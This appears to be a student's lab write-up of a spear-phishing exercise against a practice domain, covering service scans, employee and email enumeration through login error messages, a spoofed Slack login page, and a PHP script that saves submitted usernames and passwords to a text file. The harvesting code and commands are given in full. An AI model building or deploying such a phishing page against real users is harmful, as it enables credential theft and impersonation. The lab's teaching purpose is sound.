Project 192 - Spear Phishing Campaign: Spoofing A Messaging App


1. nmap -sV twire.io (to run a service scan on the target domain)

^ SSH, HTTP, HTTPS ports are open and the target is running an Ubuntu OS and using an Apache web server

Enumerating Target's Security Certificate Information

2. Opened browser and navigated to https://twire.io (advanced button and accept risk)

3. Clicked pad lock icon in the URL bar, clicked "connection not secure", and then clicked "More Information" (to view the SSL certificate details)

4. Clicked the "View Certificate" button

Enumerating Target's Employees

5. Back in https://twire.io tab, scrolled all the way to the bottom and took note of employee names and the URL for the staff page

6. Navigated to "app.twire.io" (to find a login page)

7. Back in the terminal, nmap -sC -sV app.twire.io (to gather more information about the target URL)

^ we can see the HTTP port is open and the underlying OS is Ubuntu running on an Apache web server (http title is "Platform Under Development")

8. Back in the browser, entered "test@test.com" as the email and "123456" as the password (will fail, but return a message saying the email doesn't exit)

Email Enumeration

9. Entered "dwayne@twire.io" as the email without entering a password (will fail, but return a message saying the password is wrong)

^ I've aggregated some of the information gathered so far (employee name, company name, error message) to formulate a strategy to accurately guess an email format and deduce the existence of specific accounts

10. Back in the terminal, echo "dwayne@twire.io" > /home/ubuntu-user/Desktop/emails.txt (to copy the email address to an output file named "email.txt").

11. Navigating back to twire/io's homepage, reading Dwayne's comments reveals that he's used the Slack platform for communications

^ Now that I know specific applications use internally, I know what to spoof


Creating the Spearphishing Bait

12. Back in the terminal, sudo rm -rf /var/www/html/* (to clear the default HTML directory) - passw0rd!

13. sudo nano -l Downloads/html/index.html (to edit the login page with the nano text editor so that it contains the name of the server harvesting the credentials)

14. Scrolled down to line 36 and replaced the login form with the following: form action = "harvestcreds.php" method="POST"

^ HTML forms contain an attribute called action. This attribute specifies where to send the form data after a form is submitted. When the webserver receives this data, it decides what kind of calculations to perform on them based on the value of the form attribute.

This method will redirect the webpage to a PHP file that stores the target's credentials. 

15. On lines 47 and 48, changed everywhere that says "Email" to "Password"


^The login form currently only asks for an email, with no password input field. Since the focus is on harvesting credentials, I modify the form to accept a password input instead of an email.

16. Ctrl + X and Y (to save and exit)

17. sudo mv Downloads/html/ /var/www/ (to move the templates folder to the hosting directory /var/www/html)


Creating PHP file for Credential Harvesting

I'm going to write a PHP script that reads the form values, saves them into variables, and then writes these variables to a text file.

18. cd /var/www/html (to switch to the hosting directory)

19. sudo nano harvestcreds.php (to create the PHP file in the same directory using the nano text editor)

20. Add the following code to the file:

<?php
    if(isset($_POST['submit_btn']))
    {
        $username = $_POST['name'];
        $password = $_POST['password'];
        $text = $username . "," . $password . "\n";
        $fp = fopen('accounts.txt', 'a+');

            if(fwrite($fp, $text)) {
                echo 'saved';
            }
fclose ($fp);
header("Location: http://localhost ");
die();       
    }?>

^ The code should check if the POST request from the Sign in with Email button is submitted using the isset() function. Then, save the user inputs into two variables, $username and $password, and combine them into a single variable, $text.

Writing the user's input to a file:

declares a variable $fp with fopen() and fclose() to create accounts.txt, and uses fwrite() to write the $text variable

Redirect the user to localhost

Uses the header() function to redirect the user to localhost, so after submitting, the page will redirect back.

21. Ctrl + X and Y (to save and exit)

22. sudo touch accounts.txt (to create the accounts.txt file which will store credentials)

23. sudo chmod 777 /var/www/html/accounts.txt (to store the credentials and grant write permissions to the accounts.txt)

24. ls -al /var/www/html (to verify the permissions of the accounts.txt file)


Setting up Apache Server

I'm going to start a web server on the host machine to display the phishing page and make it accessible.

25. sudo service apache2 start (to start an Apache web server)

26. Back in the browser, navigated to http://localhost (to enter spoofed Slack landing page)

27. Entered "dwayne.twire.io" and a password (to generate credentials to capture)

28. Back in terminal, sudo cat /var/www/html/accounts.txt (to view captured credentials)
